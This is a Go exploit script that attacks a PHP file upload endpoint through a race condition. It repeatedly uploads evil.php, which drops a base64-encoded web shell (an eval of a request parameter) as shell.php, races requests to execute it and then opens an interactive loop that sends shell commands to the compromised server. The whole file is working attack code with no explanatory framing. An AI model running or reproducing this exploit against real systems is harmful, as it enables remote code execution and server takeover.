package main

import (
	"bufio"
	"bytes"
	"context"
	"io"
	"io/ioutil"
	"mime/multipart"
	"net/http"
	"net/url"
	"os"
	"time"
)

var ctx, cancel = context.WithCancel(context.Background())

func upload(u string) {
	for {
		select {
		case <-ctx.Done():
			return
		default:
			body := new(bytes.Buffer)
			writer := multipart.NewWriter(body)
			formFile, _ := writer.CreateFormFile("file", "evil.php")
			content := `<?php file_put_contents('shell.php',base64_decode('PD9waHAgZXZhbCgkX1JFUVVFU1RbImNvZGUiXSk7Pz4='));?>`
			io.Copy(formFile, bytes.NewReader([]byte(content)))
			writer.WriteField("hello", "shit")
			client := http.Client{Timeout: 3 * time.Second}
			client.Post(u, writer.FormDataContentType(), body)
		}
	}
}

func visit_shell(u string) {
	for {
		select {
		case <-ctx.Done():
			return
		default:
			client := http.Client{Timeout: 3 * time.Second}
			client.Get(u)
		}
	}
}

func get_shell(u string) {
	for {
		select {
		case <-ctx.Done():
			return
		default:
			client := http.Client{Timeout: 3 * time.Second}
			resp, err := client.Get(u)
			if err == nil && resp.StatusCode == 200 {
				cancel()
				println("[!] Get Shell  !!! ....")
			}
		}
	}
}

func main() {
	var u string
	if len(os.Args) > 1 {
		u = os.Args[1]
	} else {
		println("[+] Usage: go run exp.go <http://host:port>")
		println("(default)  go run exp.go http://127.0.0.1:12345")
		u = "http://127.0.0.1:12345"
		return
	}
	for i := 0; i < 20; i++ {
		go upload(u + "/index.php")
		go visit_shell(u + "/upload/evil.php")
		go get_shell(u + "/upload/shell.php")
	}
	input := bufio.NewScanner(os.Stdin)
	for {
		select {
		case <-ctx.Done():
			print("> ")
			input.Scan()
			var cmd = input.Text()
			println(cmd)
			u, _ := url.Parse(u + "/upload/shell.php")
			u.RawQuery = url.Values{"code": []string{cmd}}.Encode()
			println(u.String())
			resp, _ := http.Get(u.String())
			content, _ := ioutil.ReadAll(resp.Body)
			println(string(content))
		default:
		}
	}
}
